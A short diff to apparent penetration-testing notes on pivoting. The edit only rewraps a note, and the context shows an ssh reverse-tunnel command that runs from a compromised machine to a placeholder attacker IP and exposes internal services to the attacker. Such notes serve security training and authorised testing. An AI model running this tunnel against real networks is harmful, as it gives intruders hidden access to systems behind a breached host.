@@ -33,5 +33,6 @@ Proxy from a compromised machine to the Attacker machine
 
 > ssh -R <ATTACKER's PORT> <ATTACKER's USERNAME>@<ATTACKER's IP> -i <PRIVATE KEY FILE> -fN
 
-** NOTE: These methods are done when there are other target machines whose services are only accessible over the compromised machine ports in which case you 'forward the ports / proxy' to enable access to those services on the attacker's machine. **
+** NOTE: These methods are done when there are other target machines whose services are only accessible over the compromised machine ports.
+ In such cases you 'forward the ports / proxy' to enable access to those services on the attacker's machine. **
 ***************************************************************************************************************************************************************************
